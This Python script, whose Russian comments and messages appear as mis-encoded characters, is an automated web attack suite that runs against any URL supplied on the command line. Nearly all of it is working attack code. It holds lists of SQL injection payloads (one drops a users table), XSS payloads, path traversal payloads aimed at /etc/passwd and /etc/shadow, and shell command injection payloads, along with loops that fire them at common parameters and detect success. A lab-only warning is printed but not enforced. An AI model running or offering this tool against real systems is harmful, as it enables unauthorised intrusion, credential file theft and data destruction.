#!/usr/bin/env python3
"""
–ö–æ–º–ø–ª–µ–∫—Å–Ω—ã–π –Ω–∞–±–æ—Ä –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–≤ –¥–ª—è –≤–µ–±-–∞—Ç–∞–∫
–í–ù–ò–ú–ê–ù–ò–ï: –¢–æ–ª—å–∫–æ –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –≤ —Å–æ–±—Å—Ç–≤–µ–Ω–Ω–æ–π –ª–∞–±–æ—Ä–∞—Ç–æ—Ä–Ω–æ–π —Å—Ä–µ–¥–µ!

–ê–≤—Ç–æ—Ä: –û–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã–π –º–∞—Ç–µ—Ä–∏–∞–ª –¥–ª—è –∏–∑—É—á–µ–Ω–∏—è –∫–∏–±–µ—Ä–±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
–õ–∏—Ü–µ–Ω–∑–∏—è: –¢–æ–ª—å–∫–æ –¥–ª—è –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª–µ–π
"""

import requests
import sys
import time
import argparse
import re
import urllib.parse
from bs4 import BeautifulSoup

class WebAttacksSuite:
    """
    –ö–æ–º–ø–ª–µ–∫—Å–Ω—ã–π –Ω–∞–±–æ—Ä –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–≤ –¥–ª—è –≤–µ–±-–∞—Ç–∞–∫
    """
    
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.vulnerabilities_found = []
        
    def check_target_accessibility(self):
        """
        –ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç–∏ —Ü–µ–ª–∏
        """
        print(f"üîç –ü—Ä–æ–≤–µ—Ä—è–µ–º –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—å {self.target_url}")
        
        try:
            response = self.session.get(self.target_url, timeout=10)
            if response.status_code == 200:
                print("‚úÖ –¶–µ–ª—å –¥–æ—Å—Ç—É–ø–Ω–∞")
                return True
            else:
                print(f"‚ùå –¶–µ–ª—å –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞ (–∫–æ–¥: {response.status_code})")
                return False
        except Exception as e:
            print(f"‚ùå –û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è: {e}")
            return False
    
    def sql_injection_attack(self, login_url=None):
        """
        SQL Injection –∞—Ç–∞–∫–∞
        """
        print("\n" + "="*60)
        print("üíâ SQL INJECTION –ê–¢–ê–ö–ê")
        print("="*60)
        
        # SQL injection payloads
        sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' OR 1=1 --",
            "' OR 1=1 #",
            "' UNION SELECT NULL --",
            "' UNION SELECT NULL, NULL --",
            "' UNION SELECT NULL, NULL, NULL --",
            "admin'--",
            "admin' #",
            "' OR 'x'='x",
            "' OR 1=1 LIMIT 1 --",
            "'; DROP TABLE users; --",
            "' OR '1'='1' AND '1'='1",
            "1' OR '1'='1",
            "admin' OR '1'='1' --",
            "') OR ('1'='1",
            "1' OR 1=1 --",
            "1' OR 1=1 #",
            "' OR '1'='1' /*"
        ]
        
        # –¢–µ—Å—Ç–∏—Ä—É–µ–º —Ä–∞–∑–ª–∏—á–Ω—ã–µ URL
        test_urls = [
            f"{self.target_url}/login.php",
            f"{self.target_url}/login",
            f"{self.target_url}/user.php",
            f"{self.target_url}/search.php",
            f"{self.target_url}/index.php",
            f"{self.target_url}/admin/login.php"
        ]
        
        if login_url:
            test_urls = [login_url]
        
        for url in test_urls:
            print(f"\nüéØ –¢–µ—Å—Ç–∏—Ä—É–µ–º SQL injection –Ω–∞ {url}")
            
            # –¢–µ—Å—Ç–∏—Ä—É–µ–º GET –ø–∞—Ä–∞–º–µ—Ç—Ä—ã
            self._test_sql_injection_get(url, sql_payloads)
            
            # –¢–µ—Å—Ç–∏—Ä—É–µ–º POST –ø–∞—Ä–∞–º–µ—Ç—Ä—ã
            self._test_sql_injection_post(url, sql_payloads)
    
    def _test_sql_injection_get(self, url, payloads):
        """
        –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ SQL injection —á–µ—Ä–µ–∑ GET –ø–∞—Ä–∞–º–µ—Ç—Ä—ã
        """
        # –û–±—â–∏–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è
        test_params = ['id', 'user', 'username', 'search', 'q', 'query', 'page', 'cat', 'category']
        
        for param in test_params:
            for payload in payloads:
                try:
                    test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=5)
                    
                    if self._detect_sql_injection_success(response, payload):
                        print(f"üéâ SQL injection –Ω–∞–π–¥–µ–Ω!")
                        print(f"   URL: {test_url}")
                        print(f"   Payload: {payload}")
                        self.vulnerabilities_found.append({
                            'type': 'SQL Injection',
                            'url': test_url,
                            'payload': payload,
                            'method': 'GET'
                        })
                        return True
                        
                except Exception as e:
                    continue
        
        return False
    
    def _test_sql_injection_post(self, url, payloads):
        """
        –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ SQL injection —á–µ—Ä–µ–∑ POST –ø–∞—Ä–∞–º–µ—Ç—Ä—ã
        """
        # –¢–µ—Å—Ç–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ –¥–ª—è POST
        test_data = {
            'username': 'admin',
            'password': 'password',
            'user': 'admin',
            'pass': 'password',
            'login': 'admin',
            'pwd': 'password'
        }
        
        for payload in payloads:
            for field in ['username', 'user', 'login']:
                try:
                    data = test_data.copy()
                    data[field] = payload
                    
                    response = self.session.post(url, data=data, timeout=5)
                    
                    if self._detect_sql_injection_success(response, payload):
                        print(f"üéâ SQL injection –Ω–∞–π–¥–µ–Ω!")
                        print(f"   URL: {url}")
                        print(f"   Field: {field}")
                        print(f"   Payload: {payload}")
                        self.vulnerabilities_found.append({
                            'type': 'SQL Injection',
                            'url': url,
                            'field': field,
                            'payload': payload,
                            'method': 'POST'
                        })
                        return True
                        
                except Exception as e:
                    continue
        
        return False
    
    def _detect_sql_injection_success(self, response, payload):
        """
        –î–µ—Ç–µ–∫—Ü–∏—è —É—Å–ø–µ—à–Ω–æ–π SQL injection
        """
        # –ò–Ω–¥–∏–∫–∞—Ç–æ—Ä—ã —É—Å–ø–µ—à–Ω–æ–π SQL injection
        success_indicators = [
            'welcome',
            'login successful',
            'dashboard',
            'admin panel',
            'user logged in',
            'mysql_fetch_array',
            'mysql_num_rows',
            'sql syntax',
            'mysql error',
            'warning: mysql',
            'valid user',
            'access granted'
        ]
        
        error_indicators = [
            'mysql_fetch_array',
            'mysql_num_rows',
            'mysql error',
            'sql syntax',
            'warning: mysql',
            'sqlstate',
            'database error'
        ]
        
        response_text = response.text.lower()
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞ —É—Å–ø–µ—à–Ω—ã–π –≤—Ö–æ–¥
        for indicator in success_indicators:
            if indicator in response_text:
                return True
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞ –æ—à–∏–±–∫–∏ –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö
        for indicator in error_indicators:
            if indicator in response_text:
                return True
        
        return False
    
    def xss_attack(self):
        """
        XSS (Cross-Site Scripting) –∞—Ç–∞–∫–∞
        """
        print("\n" + "="*60)
        print("üåê XSS (CROSS-SITE SCRIPTING) –ê–¢–ê–ö–ê")
        print("="*60)
        
        # XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<div onmouseover=alert('XSS')>",
            "javascript:alert('XSS')",
            "vbscript:alert('XSS')",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(/XSS/)</script>",
            "<script>alert`XSS`</script>"
        ]
        
        # –¢–µ—Å—Ç–∏—Ä—É–µ–º —Ä–∞–∑–ª–∏—á–Ω—ã–µ URL
        test_urls = [
            f"{self.target_url}/search.php",
            f"{self.target_url}/comment.php",
            f"{self.target_url}/contact.php",
            f"{self.target_url}/feedback.php",
            f"{self.target_url}/guestbook.php",
            f"{self.target_url}/index.php"
        ]
        
        for url in test_urls:
            print(f"\nüéØ –¢–µ—Å—Ç–∏—Ä—É–µ–º XSS –Ω–∞ {url}")
            
            # –¢–µ—Å—Ç–∏—Ä—É–µ–º GET –ø–∞—Ä–∞–º–µ—Ç—Ä—ã
            self._test_xss_get(url, xss_payloads)
            
            # –¢–µ—Å—Ç–∏—Ä—É–µ–º POST –ø–∞—Ä–∞–º–µ—Ç—Ä—ã
            self._test_xss_post(url, xss_payloads)
    
    def _test_xss_get(self, url, payloads):
        """
        –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ XSS —á–µ—Ä–µ–∑ GET –ø–∞—Ä–∞–º–µ—Ç—Ä—ã
        """
        test_params = ['q', 'search', 'query', 'name', 'message', 'comment', 'feedback']
        
        for param in test_params:
            for payload in payloads:
                try:
                    test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=5)
                    
                    if self._detect_xss_success(response, payload):
                        print(f"üéâ XSS —É—è–∑–≤–∏–º–æ—Å—Ç—å –Ω–∞–π–¥–µ–Ω–∞!")
                        print(f"   URL: {test_url}")
                        print(f"   Payload: {payload}")
                        self.vulnerabilities_found.append({
                            'type': 'XSS',
                            'url': test_url,
                            'payload': payload,
                            'method': 'GET'
                        })
                        return True
                        
                except Exception as e:
                    continue
        
        return False
    
    def _test_xss_post(self, url, payloads):
        """
        –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ XSS —á–µ—Ä–µ–∑ POST –ø–∞—Ä–∞–º–µ—Ç—Ä—ã
        """
        test_data = {
            'name': 'test',
            'message': 'test message',
            'comment': 'test comment',
            'feedback': 'test feedback',
            'email': 'test@test.com'
        }
        
        for payload in payloads:
            for field in ['name', 'message', 'comment', 'feedback']:
                try:
                    data = test_data.copy()
                    data[field] = payload
                    
                    response = self.session.post(url, data=data, timeout=5)
                    
                    if self._detect_xss_success(response, payload):
                        print(f"üéâ XSS —É—è–∑–≤–∏–º–æ—Å—Ç—å –Ω–∞–π–¥–µ–Ω–∞!")
                        print(f"   URL: {url}")
                        print(f"   Field: {field}")
                        print(f"   Payload: {payload}")
                        self.vulnerabilities_found.append({
                            'type': 'XSS',
                            'url': url,
                            'field': field,
                            'payload': payload,
                            'method': 'POST'
                        })
                        return True
                        
                except Exception as e:
                    continue
        
        return False
    
    def _detect_xss_success(self, response, payload):
        """
        –î–µ—Ç–µ–∫—Ü–∏—è —É—Å–ø–µ—à–Ω–æ–π XSS –∞—Ç–∞–∫–∏
        """
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –æ—Ç—Ä–∞–∂–µ–Ω –ª–∏ payload –≤ –æ—Ç–≤–µ—Ç–µ
        if payload in response.text:
            return True
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞ –Ω–∞–ª–∏—á–∏–µ script —Ç–µ–≥–æ–≤
        if '<script>' in response.text and 'alert' in response.text:
            return True
        
        return False
    
    def directory_traversal_attack(self):
        """
        Directory Traversal –∞—Ç–∞–∫–∞
        """
        print("\n" + "="*60)
        print("üìÅ DIRECTORY TRAVERSAL –ê–¢–ê–ö–ê")
        print("="*60)
        
        # Directory traversal payloads
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/etc/motd",
            "/proc/version",
            "/proc/cpuinfo",
            "/proc/meminfo",
            "c:\\windows\\system32\\drivers\\etc\\hosts",
            "c:\\boot.ini",
            "c:\\windows\\win.ini"
        ]
        
        # –¢–µ—Å—Ç–∏—Ä—É–µ–º —Ä–∞–∑–ª–∏—á–Ω—ã–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã
        test_params = ['file', 'path', 'page', 'include', 'doc', 'document', 'filename', 'path']
        
        for param in test_params:
            for payload in traversal_payloads:
                try:
                    test_url = f"{self.target_url}/index.php?{param}={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=5)
                    
                    if self._detect_directory_traversal_success(response):
                        print(f"üéâ Directory Traversal –Ω–∞–π–¥–µ–Ω!")
                        print(f"   URL: {test_url}")
                        print(f"   Payload: {payload}")
                        self.vulnerabilities_found.append({
                            'type': 'Directory Traversal',
                            'url': test_url,
                            'payload': payload
                        })
                        return True
                        
                except Exception as e:
                    continue
        
        return False
    
    def _detect_directory_traversal_success(self, response):
        """
        –î–µ—Ç–µ–∫—Ü–∏—è —É—Å–ø–µ—à–Ω–æ–π Directory Traversal –∞—Ç–∞–∫–∏
        """
        # –ò–Ω–¥–∏–∫–∞—Ç–æ—Ä—ã —É—Å–ø–µ—à–Ω–æ–≥–æ —á—Ç–µ–Ω–∏—è —Ñ–∞–π–ª–æ–≤
        success_indicators = [
            'root:x:0:0:',
            '[boot loader]',
            'Microsoft Windows',
            'kernel version',
            'processor',
            'memtotal:',
            'localhost'
        ]
        
        response_text = response.text.lower()
        
        for indicator in success_indicators:
            if indicator.lower() in response_text:
                return True
        
        return False
    
    def command_injection_attack(self):
        """
        Command Injection –∞—Ç–∞–∫–∞
        """
        print("\n" + "="*60)
        print("‚ö° COMMAND INJECTION –ê–¢–ê–ö–ê")
        print("="*60)
        
        # Command injection payloads
        cmd_payloads = [
            "; ls -la",
            "| ls -la",
            "&& ls -la",
            "|| ls -la",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "&& cat /etc/passwd",
            "; whoami",
            "| whoami",
            "&& whoami",
            "; id",
            "| id",
            "&& id",
            "; uname -a",
            "| uname -a",
            "&& uname -a",
            "; pwd",
            "| pwd",
            "&& pwd",
            "; ps aux",
            "| ps aux",
            "&& ps aux"
        ]
        
        # –¢–µ—Å—Ç–∏—Ä—É–µ–º —Ä–∞–∑–ª–∏—á–Ω—ã–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã
        test_params = ['cmd', 'command', 'exec', 'system', 'ping', 'host', 'ip', 'domain']
        
        for param in test_params:
            for payload in cmd_payloads:
                try:
                    test_url = f"{self.target_url}/index.php?{param}={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=5)
                    
                    if self._detect_command_injection_success(response):
                        print(f"üéâ Command Injection –Ω–∞–π–¥–µ–Ω!")
                        print(f"   URL: {test_url}")
                        print(f"   Payload: {payload}")
                        self.vulnerabilities_found.append({
                            'type': 'Command Injection',
                            'url': test_url,
                            'payload': payload
                        })
                        return True
                        
                except Exception as e:
                    continue
        
        return False
    
    def _detect_command_injection_success(self, response):
        """
        –î–µ—Ç–µ–∫—Ü–∏—è —É—Å–ø–µ—à–Ω–æ–π Command Injection –∞—Ç–∞–∫–∏
        """
        # –ò–Ω–¥–∏–∫–∞—Ç–æ—Ä—ã —É—Å–ø–µ—à–Ω–æ–≥–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥
        success_indicators = [
            'total ',
            'drwx',
            'root:x:0:0:',
            'uid=',
            'gid=',
            'linux',
            'darwin',
            'microsoft',
            '/bin/bash',
            '/usr/bin',
            '/var/www',
            'apache',
            'nginx',
            'mysql',
            'postgres'
        ]
        
        response_text = response.text.lower()
        
        for indicator in success_indicators:
            if indicator in response_text:
                return True
        
        return False
    
    def run_full_web_attack(self):
        """
        –ó–∞–ø—É—Å–∫ –ø–æ–ª–Ω–æ–≥–æ –Ω–∞–±–æ—Ä–∞ –≤–µ–±-–∞—Ç–∞–∫
        """
        print("üåê –ö–û–ú–ü–õ–ï–ö–°–ù–´–ï –í–ï–ë-–ê–¢–ê–ö–ò")
        print("="*60)
        print("‚ö†Ô∏è  –í–ù–ò–ú–ê–ù–ò–ï: –¢–æ–ª—å–∫–æ –¥–ª—è —Å–æ–±—Å—Ç–≤–µ–Ω–Ω–æ–π –ª–∞–±–æ—Ä–∞—Ç–æ—Ä–Ω–æ–π —Å—Ä–µ–¥—ã!")
        print("="*60)
        
        if not self.check_target_accessibility():
            return False
        
        start_time = time.time()
        
        try:
            # –í—ã–ø–æ–ª–Ω—è–µ–º –≤—Å–µ —Ç–∏–ø—ã –∞—Ç–∞–∫
            self.sql_injection_attack()
            self.xss_attack()
            self.directory_traversal_attack()
            self.command_injection_attack()
            
            # –§–∏–Ω–∞–ª—å–Ω–∞—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞
            end_time = time.time()
            duration = end_time - start_time
            
            print(f"\nüèÅ –í–ï–ë-–ê–¢–ê–ö–ò –ó–ê–í–ï–†–®–ï–ù–´")
            print(f"‚è±Ô∏è  –û–±—â–µ–µ –≤—Ä–µ–º—è: {duration:.1f} —Å–µ–∫—É–Ω–¥")
            print(f"üéØ –ù–∞–π–¥–µ–Ω–æ —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π: {len(self.vulnerabilities_found)}")
            
            if self.vulnerabilities_found:
                print(f"\nüìã –ù–ê–ô–î–ï–ù–ù–´–ï –£–Ø–ó–í–ò–ú–û–°–¢–ò:")
                for vuln in self.vulnerabilities_found:
                    print(f"  üö® {vuln['type']}: {vuln['url']}")
            else:
                print(f"\n‚úÖ –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∏—Ö —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π –Ω–µ –Ω–∞–π–¥–µ–Ω–æ")
            
            print(f"\nüìö –û–ë–†–ê–ó–û–í–ê–¢–ï–õ–¨–ù–ê–Ø –¶–ï–ù–ù–û–°–¢–¨:")
            print("  ‚Ä¢ –ò–∑—É—á–µ–Ω—ã –æ—Å–Ω–æ–≤–Ω—ã–µ –≤–µ–±-—É—è–∑–≤–∏–º–æ—Å—Ç–∏")
            print("  ‚Ä¢ –ü–æ–Ω–∏–º–∞–Ω–∏–µ –º–µ—Ç–æ–¥–æ–≤ –∞—Ç–∞–∫ –∏ –∑–∞—â–∏—Ç—ã")
            print("  ‚Ä¢ –ü—Ä–∞–∫—Ç–∏—á–µ—Å–∫–∏–π –æ–ø—ã—Ç —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –≤–µ–±-–±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏")
            
        except KeyboardInterrupt:
            print("\nüõë –í–µ–±-–∞—Ç–∞–∫–∏ –ø—Ä–µ—Ä–≤–∞–Ω—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º")
        except Exception as e:
            print(f"\n‚ùå –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞: {e}")

def main():
    """
    –ì–ª–∞–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –≤–µ–±-–∞—Ç–∞–∫
    """
    parser = argparse.ArgumentParser(description='–ö–æ–º–ø–ª–µ–∫—Å–Ω—ã–µ –≤–µ–±-–∞—Ç–∞–∫–∏')
    parser.add_argument('target', help='URL —Ü–µ–ª–∏ (–Ω–∞–ø—Ä–∏–º–µ—Ä, http://10.211.55.14)')
    parser.add_argument('--sql', action='store_true', help='–¢–æ–ª—å–∫–æ SQL injection')
    parser.add_argument('--xss', action='store_true', help='–¢–æ–ª—å–∫–æ XSS')
    parser.add_argument('--traversal', action='store_true', help='–¢–æ–ª—å–∫–æ Directory Traversal')
    parser.add_argument('--cmd', action='store_true', help='–¢–æ–ª—å–∫–æ Command Injection')
    
    args = parser.parse_args()
    
    # –°–æ–∑–¥–∞–µ–º —ç–∫–∑–µ–º–ø–ª—è—Ä –≤–µ–±-–∞—Ç–∞–∫
    web_attacks = WebAttacksSuite(args.target)
    
    try:
        if args.sql:
            web_attacks.sql_injection_attack()
        elif args.xss:
            web_attacks.xss_attack()
        elif args.traversal:
            web_attacks.directory_traversal_attack()
        elif args.cmd:
            web_attacks.command_injection_attack()
        else:
            # –ü–æ–ª–Ω—ã–π –Ω–∞–±–æ—Ä –∞—Ç–∞–∫
            web_attacks.run_full_web_attack()
            
    except KeyboardInterrupt:
        print("\nüõë –í–µ–±-–∞—Ç–∞–∫–∏ –ø—Ä–µ—Ä–≤–∞–Ω—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º")
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞: {e}")

if __name__ == "__main__":
    main()
